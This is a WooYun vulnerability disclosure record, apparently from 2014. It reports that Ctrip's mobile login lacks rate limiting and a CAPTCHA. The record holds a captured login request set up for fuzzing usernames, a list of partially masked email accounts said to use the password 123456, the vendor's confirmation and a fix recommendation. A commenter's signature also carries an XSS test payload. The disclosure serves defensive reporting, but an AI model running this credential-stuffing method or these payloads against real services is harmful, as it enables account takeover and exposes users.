{"id": 468, "wybug_id": "wooyun-2014-075056", "wybug_title": "携程某接口设计缺陷可进行扫号（可获取大量账号密码）", "wybug_corp": "携程旅行网", "wybug_author": "niliu", "wybug_date": "2014-09-04 19:33", "wybug_open_date": "2014-10-24 19:36", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t该漏洞正等待厂商内部评估\t\t\t\t\t\t\t\t\t2014-09-04：\t厂商已经确认，与白帽子共同解决该漏洞中，漏洞信息仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向公众公开  简要描述： 接口限制总有遗漏，涉及用户数据，提交！ 详细说明： 问题接口出现在携程触屏版登陆\nhttp://m.ctrip.com/html5/Account/Login.html\n\n\n经简单测试发现登陆没有错误次数限制，也不会弹出验证码。于是随便输入用户名，密码。登陆时抓包进行fuzz抓包数据\nPOST /html5/Account/LoginValidation HTTP/1.1Host: m.ctrip.comProxy-Connection: keep-aliveContent-Length: 292Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestOrigin: http://m.ctrip.comUser-Agent: Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X; en-us) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3Content-Type: application/x-www-form-urlencoded; charset=UTF-8DNT: 1Referer: http://m.ctrip.com/html5/Account/Login.htmlAccept-Encoding: gzip,deflateAccept-Language: zh-CNCookie: UID=§admin§&Password=2ec5ed31996e031281e8da203fa1a2851921cbb7b2cd27bdf4a0ab9fe430f035391638c46e25e821035b5ff71a08b84cb9eaa7573d5988122483ec14ca2331c42e61bb74ff7d1b6853bafaf9b09c376a462fa3c8a582e752b2fcff9dcdf3af080558daea8fd973afd92b4b42e2c64377e5876257484eb4a671c3b83cc315d138&IsRemember=false\n可以看到密码是经过加密的。我就以密码不变，随便找个最简单的弱口令123456来进行测试测试一部分邮箱账号。\n\n返回包402的为密码错误，大于402的都是可以登陆的贴出部分证明\nguob***e@126.comc***z@sohu.come***0@163.coms***f@163.com9***8@qq.coml***x@163.come***@126.comlx***37@sina.coms***ow@126.com5***07@qq.comn***8@126.com***ND@163.COMz***01@163.comde***ha@sina.com13***0@139.com46***7@163.COMl***08@163.coms***ngel@163.comx***n_2001@126.commu***@126.comso***i3226@126.com4***224@qq.comho***en@gmail.comi***lc@sina.comj***5@gmail.comand***st@hotmail.comj***ao@126.comhu***n@qq.com2***32@qq.com7***692@qq.compr***j@126.coml***@163.com54***36@QQ.comchi***32@163.com\n以上这些账号密码均为123456,。贴部分登陆证明b***e@126.com\n\n5***7@qq.com\n\nhu***n@qq.com\n\ng**\n\n\n\n  漏洞证明： 综上所述，密码可以变换其他的来进行测试。在大数据时代，基于之前泄露的各种用户数据进行测试，影响用户数量还是很可观的.  修复方案： 对触屏版登陆接口进行登陆次数限制。加入验证码进行限制。  版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应 厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-04 19:35 厂商回复： 漏洞已确认真实存在，并已安排人处理。 最新状态： 暂无 ", "replys": "漏洞评价：\n评论\n     2014-10-24 19:55 |    \t\t切克脑 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | z..)\t\t \n  这么多$$$$$$$$$$$$$$$$$$$$$$$    \n     2014-10-24 20:21 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  为何这么多$$$???    \n     2014-10-24 20:33 |    \t\t咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:20        )\t\t \n  邮箱是怎么搞到的    \n     2014-10-24 21:30 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  卧槽、3000啊    \n     2014-10-24 22:43 |    \t\t切克脑 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | z..)\t\t \n  呀$$$$$$$$$$$$没了    \n     2014-10-24 22:44 |    \t\t切克脑 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | z..)\t\t \n  点进去就不显示了...    \n     2014-10-26 00:25 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @老和尚 $$$。。。一个是几十几百 两个是几百几千 三个 这漏洞都上 国家级刊物 计算机安全了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}